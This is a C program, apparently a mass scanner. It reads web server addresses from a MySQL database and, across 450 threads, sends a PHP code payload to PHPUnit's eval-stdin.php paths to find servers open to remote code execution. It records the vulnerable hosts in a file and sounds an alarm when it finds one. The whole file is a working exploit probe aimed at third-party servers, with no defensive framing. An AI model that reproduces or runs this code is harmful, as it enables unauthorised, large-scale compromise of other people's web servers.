#include <arpa/inet.h>
#include <stdio.h>
#include <string.h>
#include <time.h>
#include <fcntl.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <errno.h>
#include <unistd.h>
#include <signal.h>
#include <poll.h>
#include <netinet/tcp.h>
#include <netdb.h>
#include <pthread.h>
#include <mysql.h>
#include <ctype.h>

#define BUFFER_SIZE 1024 * 1024
#define MAX_TH 	450
#define RESET   "\033[0m"
#define BLACK   "\033[30m"      /* Black */
#define RED     "\033[31m"      /* Red */
#define GREEN   "\033[32m"      /* Green */
#define YELLOW  "\033[33m"      /* Yellow */
#define BLUE    "\033[34m"      /* Blue */
#define MAGENTA "\033[35m"      /* Magenta */
#define CYAN    "\033[36m"      /* Cyan */
#define WHITE   "\033[37m"      /* White */
#define BOLDBLACK   "\033[1m\033[30m"      /* Bold Black */
#define BOLDRED     "\033[1m\033[31m"      /* Bold Red */
#define BOLDGREEN   "\033[1m\033[32m"      /* Bold Green */
#define BOLDYELLOW  "\033[1m\033[33m"      /* Bold Yellow */
#define BOLDBLUE    "\033[1m\033[34m"      /* Bold Blue */
#define BOLDMAGENTA "\033[1m\033[35m"      /* Bold Magenta */
#define BOLDCYAN    "\033[1m\033[36m"      /* Bold Cyan */
#define BOLDWHITE   "\033[1m\033[37m"      /* Bold White */
pthread_mutex_t lock;
pthread_cond_t cond;
char *server = "localhost";
char *user = "root";
char *password = ""; /* set me first */
char *database = "dados";
void InitPilha();
int pilhaVazia();
void empilha(char ip[30], int porta, int id);
void desempilha(char *ip, int *porta, int *id);
void * worker();
void head(char *host, int port, char *banner, char *headers);
void grava(char arquivo[], char ip[], int porta);
int contador = 0;
struct node {
    int id;
    int porta;
    char ip[30];
    struct node * prox;
};
struct node *pilhaptr;

int main(int argc, char *argv[]){
    pthread_t th[MAX_TH];
    int porta, id, z,i, ti;
    char ip[30];
    MYSQL *conn;
    MYSQL_RES *res;
    MYSQL_ROW row;
    char str[200];
    sprintf(str, "SELECT id, ip, porta FROM ips WHERE checado3 is null and (server like '%%apache%%' or server like '%%nginx%%' or server like '%%lighttpd%%' or headers like '%PHPSESSIONID%') and server not like '%%Microsoft%%' order by id  asc limit 0,100000");
    printf("%s\n", str);
    conn = mysql_init(NULL);
    if (!mysql_real_connect(conn, server, user, password, database, 0, NULL, 0)) {
        fprintf(stderr, "%s\n", mysql_error(conn));
        exit(1);
    }
    if (mysql_query(conn, str)) {
        fprintf(stderr, "%s\n", mysql_error(conn));
        exit(1);
    }
    InitPilha();
    res = mysql_use_result(conn);
    while ((row = mysql_fetch_row(res)) != NULL){
        empilha(row[1], atoi(row[2]), atoi(row[0]));
    }
    mysql_free_result(res);
    mysql_close(conn);
    pthread_mutex_init(&lock, NULL);
    pthread_cond_init(&cond, NULL);    

    if(pilhaVazia() != 1){
        for(ti = 0; ti <MAX_TH; ti++){
            pthread_create(&th[ti], NULL, worker, NULL);
        }
        for(ti = 0; ti <MAX_TH; ti++){
            pthread_join(th[ti], NULL);
        }
    }
    sleep(1);
    return 0;
}

void InitPilha(){
    pilhaptr = NULL;
}

int pilhaVazia(){
    if(pilhaptr == NULL) return 1;
    else return 0;
}

void empilha(char ip[30], int porta, int id){
	struct node *p;
	p = malloc(sizeof(struct node));
	p->id = id;
    p->porta = porta;
	strcpy(p->ip, ip);
	p->prox = pilhaptr;
	pilhaptr = p;
}

void desempilha(char *ip, int *porta, int *id){
    struct node *p;
    p = pilhaptr;
    if(p==0) printf("Pilha vazia\n");
    else{
        pilhaptr = p->prox;
	//printf("des: %s %d %d\n", p->ip, p->porta, p->id);
        strcpy(ip, p->ip);
        memcpy(porta, &p->porta, sizeof(int));
        memcpy(id, &p->id, sizeof(int));
    }
}

void * worker(){
	char banner[2000], headers[4000], sql[7000], ip[30];
	int porta, id;
    	MYSQL *sc;
	sc = mysql_init(NULL);
	int cnt = 0;

    if (!mysql_real_connect(sc, server, user, password, database, 0, NULL, 0)) {
        fprintf(stderr, "%s\n", mysql_error(sc));
        exit(1);
    }
    while(pilhaVazia() != 1){
        pthread_mutex_lock(&lock);
        desempilha(ip, &porta, &id);
	contador++;
	cnt = contador;
	printf(GREEN "[%6d] %15s %4d    \r" RESET, cnt, ip, porta);
        pthread_cond_signal(&cond);
        pthread_mutex_unlock(&lock);
        head(ip, porta, banner, headers);
        sprintf(sql, "UPDATE ips SET checado3 = 1 WHERE id = %d",  id);
	//printf("%s\r", sql);
	if (mysql_query(sc, sql)) {
            fprintf(stderr, "%s\n", mysql_error(sc));
	    printf("%s\n", sql);
            exit(1);
        }
    }
    mysql_close(sc);
}



void head(char *host, int port, char *banner, char *headers){
    int fd, n, sock, max = 1900, max2=3999, l;
    char *ret, req[2000], buffer2[BUFFER_SIZE], pt[10];
    char *primeiro;
    char *links[] = {	"/phpmyadmin/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", 
    			"/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", 
    			"/vendors/phpunit/phpunit/src/Util/PHP/eval-stdin.php", 
    			"/lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
    			};
    for (l=0;l<=3;l++){
    fd_set sockets;
    struct timeval tv;
    struct addrinfo hints, *res;
    memset(&hints, 0,sizeof hints);
    hints.ai_family=AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    sprintf(pt, "%d", port);
    
    getaddrinfo(host, pt, &hints, &res);
    fd = socket(res->ai_family,res->ai_socktype,res->ai_protocol);
    tv.tv_sec = 5;
    tv.tv_usec = 0;
    setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, (char *)&tv, sizeof(tv));
    setsockopt(fd, SOL_SOCKET, SO_SNDTIMEO, (char *)&tv, sizeof(tv));
    connect(fd,res->ai_addr,res->ai_addrlen);
    if(fd != -1){
        sprintf(req, "GET %s HTTP/1.1\r\nHost: %s:%d\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\nConnection: keep-alive\r\nContent-type: text/html\r\nContent-Length: 24\r\n\r\n<?php echo md5(doug); ?>", links[l], host,port);
        //printf("%s", req);
	send(fd, req, strlen(req), 0);
	n = recv(fd, buffer2, sizeof(buffer2)-1, 0);
	buffer2[n] = '\0'; 
	primeiro = strstr(buffer2, "b07b89b1d596bc0d32cbabed34147efd");
	if(primeiro != NULL){
		printf(RED "[+] VUL: %s:%d                            \n" RESET, host,port);
		grava("vuls-php.txt", host, port);
		system("paplay alarm.ogg");
	}
	
    shutdown(fd, SHUT_RDWR);
    close(fd);
    }
    }
}       
        
void grava(char arquivo[], char ip[], int porta){
        FILE *fp;

        if((fp = fopen(arquivo, "a+")) != NULL){
                fprintf(fp, "http://%s:%d/\n", ip, porta);
                if(fclose(fp)){
                        printf("Erro ao fechar %s\n", arquivo);
                }
        }
}        
